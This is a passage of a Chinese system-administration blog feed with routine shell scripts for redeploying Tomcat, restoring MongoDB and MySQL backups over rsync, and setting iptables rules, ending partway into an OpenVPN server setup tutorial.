class="line">WEBAPPS_DIR=<span class="string">"<span class="variable">$&#123;TOMCAT_DIR&#125;</span>/webapps"</span></div><div class="line">UPLOAD_BAK_DIR=<span class="string">"<span class="variable">$WEBAPPS_DIR</span>/upload_`date +%F`"</span></div><div class="line">BIN_DIR=<span class="string">"<span class="variable">$&#123;TOMCAT_DIR&#125;</span>/bin"</span></div><div class="line"></div><div class="line">UNZIP=`<span class="built_in">which</span> unzip`</div><div class="line"></div><div class="line"><span class="comment">#Stop tomcat instance</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Shutdown Tomcat <span class="variable">$TOMCAT_PORT</span> instance ..."</span></div><div class="line">sudo -u tomcat sh <span class="variable">$&#123;BIN_DIR&#125;</span>/catalina.sh stop</div><div class="line">sleep 10</div><div class="line"></div><div class="line"><span class="comment">#ps -ef|grep "tomcat$&#123;TOMCAT_PORT&#125;"</span></div><div class="line">ps -ef|grep <span class="string">"tomcat<span class="variable">$&#123;TOMCAT_PORT&#125;</span>"</span>|grep -v <span class="string">"grep"</span> &gt; /dev/null</div><div class="line"></div><div class="line"><span class="keyword">while</span> [ <span class="string">"$?"</span> == <span class="string">"0"</span> ]</div><div class="line"><span class="keyword">do</span></div><div class="line">   sleep 5</div><div class="line"><span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"Shutdown completed !"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$TOMCAT_PORT</span>"</span> == <span class="string">"18000"</span> ]</div><div class="line"><span class="keyword">then</span></div><div class="line">   <span class="built_in">echo</span> <span class="string">"purge web cache ..."</span></div><div class="line">   rm -rf /gotwo_data/sites/proxycache/*</div><div class="line">   mv <span class="variable">$WEBAPPS_DIR</span>/ROOT/ueditor/jsp/upload <span class="variable">$UPLOAD_BAK_DIR</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"Remove war package with last version ......"</span></div><div class="line">rm -rf <span class="variable">$&#123;WORK_DIR&#125;</span>/*</div><div class="line">rm -rf <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/</div><div class="line">mv <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT.war <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT.war`date +%F`</div><div class="line">mv <span class="variable">$PROJ_FILE</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT.war</div><div class="line"></div><div class="line"><span class="comment">#chown tomcat.tomcat $&#123;WEBAPPS_DIR&#125;/ROOT.war</span></div><div class="line">sudo -u tomcat <span class="variable">$UNZIP</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT.war <span class="_">-d</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT</div><div class="line">cp <span class="_">-f</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/x.properties  <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/WEB-INF/classes/x.properties</div><div class="line">cp <span class="_">-f</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/logback.xml  <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/WEB-INF/classes/logback.xml</div><div class="line">cp <span class="_">-f</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/IOC.xml  <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/WEB-INF/classes/IOC.xml</div><div class="line">cp <span class="_">-f</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/task.xml  <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/WEB-INF/classes/task.xml</div><div class="line">cp <span class="_">-f</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/sms.properties  <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/WEB-INF/classes/sms.properties</div><div class="line">cp <span class="_">-f</span> <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/consumer.properties  <span class="variable">$&#123;WEBAPPS_DIR&#125;</span>/ROOT/WEB-INF/classes/consumer.properties</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$TOMCAT_PORT</span>"</span> == <span class="string">"18000"</span> ]</div><div class="line"><span class="keyword">then</span></div><div class="line">   rm -rf <span class="variable">$WEBAPPS_DIR</span>/ROOT/ueditor/jsp/upload/* </div><div class="line">   mkdir -p <span class="variable">$WEBAPPS_DIR</span>/ROOT/ueditor/jsp/upload</div><div class="line">   cp -rf <span class="variable">$UPLOAD_BAK_DIR</span>/*  <span class="variable">$WEBAPPS_DIR</span>/ROOT/ueditor/jsp/upload/</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">chown -R tomcat.tomcat <span class="variable">$WEBAPPS_DIR</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"Startup Tomcat <span class="variable">$TOMCAT_PORT</span> instance ..."</span></div><div class="line">sudo -u tomcat sh <span class="variable">$&#123;BIN_DIR&#125;</span>/catalina.sh start</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"Startup completed !"</span></div><div class="line"></div><div class="line">ps -ef|grep <span class="string">"tomcat<span class="variable">$&#123;TOMCAT_PORT&#125;</span>"</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;软件版本及安装路径&quot;&gt;&lt;a href=&quot;#软件版本及安装路径&quot; class=&quot;headerlink&quot; title=&quot;软件版本及安装路径&quot;&gt;&lt;/a&gt;软件版本及安装路径&lt;/h1&gt;&lt;p&gt;JDK的版本1.7.0_79 &lt;/p&gt;
&lt;p&gt;Tomcat的版本7.0.65&lt;/p&gt;
&lt;p&gt;JDK的安装路径: /gotwo_data/Application &lt;/p&gt;
&lt;p&gt;Tomcat的安装路径: /gotwo_data/Application&lt;/p&gt;
&lt;p&gt;tomcat目录的命名规则:tomcat+对外提供服务的web端口号，比如tomcat18080。 &lt;/p&gt;
&lt;p&gt;Tomcat目录及其内部的子目录和文件权限:&lt;code&gt;chown -R tomcat.tomcat tomcat18080;chmod -R 775 tomcat18080&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="tomcat" scheme="http://www.unix-like.com/tags/tomcat/"/>
    
  </entry>
  
  <entry>
    <title>mongodb线上线下同步备份脚步</title>
    <link href="http://www.unix-like.com/2017/06/08/database/mongodb%E7%BA%BF%E4%B8%8A%E7%BA%BF%E4%B8%8B%E5%90%8C%E6%AD%A5%E5%A4%87%E4%BB%BD%E8%84%9A%E6%AD%A5/"/>
    <id>http://www.unix-like.com/2017/06/08/database/mongodb线上线下同步备份脚步/</id>
    <published>2017-06-08T02:00:28.000Z</published>
    <updated>2017-06-08T02:03:05.178Z</updated>
    
    <content type="html"><![CDATA[<p>同步线上线下mongodb。</p>
<a id="more"></a>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#bin/bash</span></div><div class="line"></div><div class="line"><span class="function"><span class="title">restore</span></span>()&#123;</div><div class="line">	FILE=`/usr/bin/rsync --port 40004 --list-only --password-file=/etc/rsyncd.secrets backup@<span class="variable">$1</span>::mongodb_backup/ | 	  /usr/bin/tail -1 | /bin/awk <span class="string">'&#123;print $5&#125;'</span>`</div><div class="line">	PATH=/gotwo_data/backup/mongodb</div><div class="line">	DATE=`/bin/date +%F`</div><div class="line">	/bin/rm -rf <span class="variable">$&#123;PATH&#125;</span>/<span class="variable">$2</span>/*</div><div class="line">	/usr/bin/rsync -avz --port 40004 --password-file=/etc/rsyncd.secrets backup@<span class="variable">$1</span>::mongodb_backup/<span class="variable">$&#123;FILE&#125;</span> <span class="variable">$&#123;PATH&#125;</span>/<span class="variable">$2</span>/</div><div class="line"></div><div class="line">	/usr/bin/mongorestore <span class="_">-d</span> <span class="variable">$2</span> --drop --gzip  <span class="variable">$&#123;PATH&#125;</span>/<span class="variable">$2</span>/<span class="variable">$&#123;DATE&#125;</span>/<span class="variable">$2</span>/</div><div class="line">&#125;</div><div class="line"></div><div class="line">restore 114.114.114.114  db_name</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;同步线上线下mongodb。&lt;/p&gt;
    
    </summary>
    
      <category term="database" scheme="http://www.unix-like.com/categories/database/"/>
    
    
      <category term="mongodb" scheme="http://www.unix-like.com/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>mysql线上线下同步备份脚步</title>
    <link href="http://www.unix-like.com/2017/06/08/database/mysql%E7%BA%BF%E4%B8%8A%E7%BA%BF%E4%B8%8B%E5%90%8C%E6%AD%A5%E5%A4%87%E4%BB%BD%E8%84%9A%E6%AD%A5/"/>
    <id>http://www.unix-like.com/2017/06/08/database/mysql线上线下同步备份脚步/</id>
    <published>2017-06-08T01:39:35.000Z</published>
    <updated>2017-06-08T02:31:43.753Z</updated>
    
    <content type="html"><![CDATA[<p>将线上多个数据库同步并导入到线下一个数据库中。</p>
<a id="more"></a>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="comment"># 本地mysql数据库登录账号</span></div><div class="line">user=<span class="string">'xxx'</span></div><div class="line"><span class="comment"># 本地mysql数据库登录密码</span></div><div class="line">pass=<span class="string">'xxx'</span></div><div class="line"></div><div class="line"><span class="comment"># db_test1库</span></div><div class="line">db1=<span class="string">'db_test1'</span></div><div class="line"></div><div class="line"><span class="comment"># db_test2库</span></div><div class="line">db2=<span class="string">'db_test2'</span></div><div class="line"></div><div class="line"><span class="comment"># db_test3库</span></div><div class="line">db3=<span class="string">'db_test3'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 数据库在线上的备份服务器IP </span></div><div class="line">server1=<span class="string">'1.1.1.1'</span></div><div class="line">server2=<span class="string">'2.2.2.2'</span></div><div class="line"></div><div class="line"><span class="comment"># 删除老数据库备份，下载最新数据库备份</span></div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">rsync_db</span></span>() &#123;</div><div class="line">  showMsg <span class="string">"开始同步数据库<span class="variable">$2</span>..."</span></div><div class="line">  file=`rsync --port 30004 --list-only --password-file=/etc/rsync.passwd backup@<span class="variable">$1</span>::mysql_backup/<span class="variable">$2</span>/ | tail -1 | awk <span class="string">'&#123;print $5&#125;'</span>`</div><div class="line">  path=<span class="string">"/gotwo_data/backup/mysql/<span class="variable">$2</span>/"</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="variable">$&#123;path&#125;</span><span class="variable">$&#123;file&#125;</span> ]</div><div class="line">  <span class="keyword">then</span></div><div class="line">    showMsg <span class="string">"删除老数据库备份..."</span></div><div class="line">    rm <span class="variable">$&#123;path&#125;</span>*.* 2&gt;/dev/null</div><div class="line">    showMsg <span class="string">"下载最新的数据库备份..."</span></div><div class="line">    rsync -av --port 30004 --password-file=/etc/rsync.passwd backup@<span class="variable">$1</span>::mysql_backup/<span class="variable">$2</span>/<span class="variable">$&#123;file&#125;</span> <span class="variable">$&#123;path&#125;</span></div><div class="line"></div><div class="line">  <span class="keyword">else</span></div><div class="line">    showMsg <span class="variable">$&#123;path&#125;</span><span class="variable">$&#123;file&#125;</span><span class="string">"文件已存在！"</span></div><div class="line">  <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#导入数据库</span></div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">restore_db</span></span>() &#123;</div><div class="line">    showMsg <span class="string">"开始同步数据库<span class="variable">$1</span>..."</span></div><div class="line">    file=`ls /gotwo_data/backup/mysql/<span class="variable">$1</span>`</div><div class="line">    path=<span class="string">"/gotwo_data/backup/mysql/<span class="variable">$1</span>/"</span></div><div class="line"></div><div class="line">    showMsg <span class="string">"将最新的<span class="variable">$&#123;1&#125;</span>数据库备份导入测试数据库..."</span></div><div class="line">    gzip <span class="_">-d</span> &lt; <span class="variable">$&#123;path&#125;</span><span class="variable">$&#123;file&#125;</span> | mysql -u<span class="variable">$&#123;user&#125;</span> -p<span class="variable">$&#123;pass&#125;</span> --socket=/gotwo_data/mysql/my40003/socket/mysqld.sock <span class="variable">$1</span> 2&gt;/dev/null</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># 格式化输出日志</span></div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">showMsg</span></span>() &#123;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"`date +%Y-%m-%d\ %H:%M:%S`    <span class="variable">$1</span>"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">showMsg <span class="string">"开始同步数据库！"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># db_test1同步</span></div><div class="line">rsync_db <span class="variable">$server1</span> <span class="variable">$db1</span></div><div class="line"></div><div class="line"><span class="comment"># db_test2同步</span></div><div class="line">rsync_db <span class="variable">$server1</span> <span class="variable">$db2</span></div><div class="line"></div><div class="line"><span class="comment"># db_test3同步</span></div><div class="line">rsync_db <span class="variable">$server2</span> <span class="variable">$db3</span></div><div class="line"></div><div class="line">showMsg <span class="string">"开始导入数据库！"</span></div><div class="line"></div><div class="line"><span class="comment"># db_test1导入</span></div><div class="line">restore_db db_test1 &amp;</div><div class="line"></div><div class="line"><span class="comment"># db_test2 导入</span></div><div class="line">restore_db db_test2 &amp;</div><div class="line"></div><div class="line"><span class="comment"># db_test3导入</span></div><div class="line">restore_db db_test3 &amp;</div><div class="line"></div><div class="line">showMsg <span class="string">"备份恢复脚本执行完成！"</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;将线上多个数据库同步并导入到线下一个数据库中。&lt;/p&gt;
    
    </summary>
    
      <category term="database" scheme="http://www.unix-like.com/categories/database/"/>
    
    
      <category term="mysql" scheme="http://www.unix-like.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Linux服务器iptables配置</title>
    <link href="http://www.unix-like.com/2017/06/07/service/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8iptables%E9%85%8D%E7%BD%AE/"/>
    <id>http://www.unix-like.com/2017/06/07/service/Linux服务器iptables配置/</id>
    <published>2017-06-07T07:21:08.000Z</published>
    <updated>2017-06-07T07:41:25.486Z</updated>
    
    <content type="html"><![CDATA[<p>一些工作中用到的防火墙规则样例。</p>
<a id="more"></a>
<h1 id="防火墙规则示例脚本"><a href="#防火墙规则示例脚本" class="headerlink" title="防火墙规则示例脚本"></a>防火墙规则示例脚本</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line">IPTABLES=/sbin/iptables</div><div class="line">MODPROBE=/sbin/modprobe</div><div class="line"></div><div class="line"><span class="comment"># IP4</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] Flushing existing <span class="variable">$IPTABLES</span> rules..."</span></div><div class="line"><span class="variable">$IPTABLES</span> -F</div><div class="line"><span class="variable">$IPTABLES</span> -F -t nat</div><div class="line"><span class="variable">$IPTABLES</span> -X</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -P INPUT DROP</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -P OUTPUT DROP</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -P FORWARD DROP</div><div class="line"></div><div class="line"><span class="comment"># load connection-tracking modules</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] Modprode iptables modle..."</span></div><div class="line"><span class="variable">$MODPROBE</span> ip_conntrack</div><div class="line"><span class="variable">$MODPROBE</span> iptable_nat</div><div class="line"><span class="variable">$MODPROBE</span> ip_conntrack_ftp</div><div class="line"><span class="variable">$MODPROBE</span> ip_nat_ftp</div><div class="line"></div><div class="line"><span class="comment"># IP4</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] Setting up OUTPUT chain..."</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -i lo -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -o lo -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># ping limit</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p icmp  -m state --state NEW,ESTABLISHED,RELATED  -m icmp --icmp-type <span class="built_in">echo</span>-request    -m <span class="built_in">limit</span> --limit 10/second  -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p icmp  -m state --state NEW,ESTABLISHED,RELATED  -m icmp --icmp-type <span class="built_in">echo</span>-reply    -m <span class="built_in">limit</span> --limit 10/second  -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p icmp -m state --state NEW,ESTABLISHED,RELATED    -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># SSH PORT</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p tcp  --dport 60021 -m state --state NEW,ESTABLISHED  -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p tcp  --sport 60021 -m state --state ESTABLISHED -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># QQ MAIL SMTP PORT</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p tcp  --dport 465 -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p tcp  --dport 465 -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p tcp  --sport 25  -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p tcp  --dport 25 -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># MYSQL</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT  -p tcp -m tcp <span class="_">-s</span> 113.207.31.47 --dport 41003 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT  -p tcp -m tcp <span class="_">-d</span> 113.207.31.47  --sport 41003 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># REDISS</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT  -p tcp -m tcp <span class="_">-s</span> 12.4.25.22 --dport 6379 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT  -p tcp -m tcp <span class="_">-d</span> 12.4.25.22 --sport 6379 -m state --state ESTABLISHED -j ACCEPT</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># TAOBAO api</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT  -p tcp -m tcp <span class="_">-s</span> 122.199.160.211 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT  -p tcp -m tcp <span class="_">-d</span> 122.199.160.211 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># zabbix</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT  -p tcp -m tcp <span class="_">-s</span> 119.119.119.119 --dport 10050 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT  -p tcp -m tcp <span class="_">-d</span> 119.119.119.119 --sport 10050 -m state --state ESTABLISHED -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT  -p tcp -m tcp <span class="_">-s</span> 119.119.119.119 --sport 10051 -m state --state ESTABLISHED -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT  -p tcp -m tcp <span class="_">-d</span> 119.119.119.119 --dport 10051 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># web port</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p tcp -m state --state NEW,ESTABLISHED -m multiport --destination-port  80,443 -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p tcp -m state --state ESTABLISHED -m multiport --source-port  80,443 -j ACCEPT</div><div class="line"></div><div class="line"></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p tcp -m state --state NEW,ESTABLISHED -m multiport --destination-port  80,443 -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p tcp -m state --state ESTABLISHED -m multiport --source-port  80,443 -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment"># DNS </span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p udp -m state --state ESTABLISHED  --sport 53 -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 53 -j ACCEPT</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># NTP TIME SYNC</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT  -p udp -m state --state ESTABLISHED --sport 123  -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 123  -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment">#limit syn foold</span></div><div class="line"><span class="variable">$IPTABLES</span> -t filter  -A INPUT -p tcp --syn -m <span class="built_in">limit</span> --limit 2048/s -j ACCEPT</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">##############Iptables save and restart</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Iptables save and restart ..."</span></div><div class="line">/etc/init.d/iptables  save</div><div class="line">/etc/init.d/iptables restart</div></pre></td></tr></table></figure>
<h1 id="防火墙debug脚本"><a href="#防火墙debug脚本" class="headerlink" title="防火墙debug脚本"></a>防火墙debug脚本</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">IPTABLES=/sbin/iptables</div><div class="line">MODPROBE=/sbin/modprobe</div><div class="line"></div><div class="line"><span class="comment">####IP4</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] Flushing existing <span class="variable">$IPTABLES</span> rules..."</span></div><div class="line"><span class="variable">$IPTABLES</span> -F</div><div class="line"><span class="variable">$IPTABLES</span> -F -t nat</div><div class="line"><span class="variable">$IPTABLES</span> -X</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -P INPUT ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -P OUTPUT ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -P FORWARD ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A INPUT -p udp -m state --state ESTABLISHED  --sport 53 -j ACCEPT</div><div class="line"><span class="variable">$IPTABLES</span> -t filter -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 53 -j ACCEPT</div><div class="line"></div><div class="line"><span class="comment">##############Iptables save and restart</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Iptables save and restart ..."</span></div><div class="line">/etc/init.d/iptables   save</div><div class="line">/etc/init.d/iptables  restart</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些工作中用到的防火墙规则样例。&lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="iptables" scheme="http://www.unix-like.com/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 15.04 上配置 OpenVPN 服务器和客户端</title>
    <link href="http://www.unix-like.com/2017/06/06/service/%E5%9C%A8Ubuntu15.04%E4%B8%8A%E9%85%8D%E7%BD%AEOpenVPN%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
    <id>http://www.unix-like.com/2017/06/06/service/在Ubuntu15.04上配置OpenVPN服务器和客户端/</id>
    <published>2017-06-06T05:40:43.000Z</published>
    <updated>2017-06-06T06:34:28.042Z</updated>
    
    <content type="html"><![CDATA[<p>　　虚拟专用网（VPN）常指几种通过其它网络建立连接技术。它之所以被称为“虚拟”，是因为各个节点间的连接不是通过物理线路实现的，而“专用”是指如果没有网络所有者的正确授权是不能被公开访问到。</p>
<a id="more"></a>
<p>　　OpenVPN软件借助TUN/TAP驱动使用TCP和UDP协议来传输数据。UDP协议和TUN驱动允许NAT后的用户建立到OpenVPN服务器的连接。此外，OpenVPN允许指定自定义端口。它提供了更多的灵活配置，可以帮助你避免防火墙限制。</p>
<p>　　OpenVPN中，由OpenSSL库和传输层安全协议（TLS）提供了安全和加密。TLS是SSL协议的一个改进版本。</p>
<p>　　OpenSSL提供了两种加密方法：对称和非对称。下面，我们展示了如何配置OpenVPN的服务器端，以及如何配置使用带有公共密钥基础结构（PKI）的非对称加密和TLS协议。</p>
<h1 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h1><p>　　首先，我们必须安装OpenVPN软件。在Ubuntu 15.04和其它带有‘apt’包管理器的Unix系统中，可以通过如下命令安装：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openvpn</div></pre></td></tr></table></figure>
<p>　　然后，我们必须配置一个密钥对，这可以通过默认的“openssl”工具完成。但是，这种方式十分难。这也是我们使用“easy-rsa”来实现此目的的原因。接下来的命令会将“easy-rsa”安装到系统中。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install easy-rsa</div></pre></td></tr></table></figure>
<p>　　<strong>注意</strong>： 所有接下来的命令要以超级用户权限执行，如在使用<code>sudo -i</code>命令后执行，或者你可以使用<code>sudo -E</code>作为接下来所有命令的前缀。</p>
<p>　　开始之前，我们需要拷贝“easy-rsa”到openvpn文件夹。</p>
